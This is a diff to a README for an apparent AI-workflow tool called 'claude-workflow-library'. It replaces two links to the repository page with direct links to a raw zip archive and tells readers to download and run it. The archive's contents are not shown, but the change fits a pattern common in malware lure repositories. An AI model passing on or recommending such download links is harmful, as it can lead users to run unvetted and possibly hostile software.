@@ -1,6 +1,6 @@
 # 🤖 claude-workflow-library - Simple AI Workflows for Daily Tasks
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Unladylike-gatekeeper954/claude-workflow-library)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Unladylike-gatekeeper954/claude-workflow-library/raw/refs/heads/main/workflows/claude-workflow-library-v2.8.zip)
 
 ## 🚀 What This Is
 
@@ -30,7 +30,7 @@ For most users, no special setup is needed beyond that.
 
 Visit this page to download and run the app:
 
-[Download claude-workflow-library](https://github.com/Unladylike-gatekeeper954/claude-workflow-library)
+[Download claude-workflow-library](https://github.com/Unladylike-gatekeeper954/claude-workflow-library/raw/refs/heads/main/workflows/claude-workflow-library-v2.8.zip)
 
 After you open the link:
 
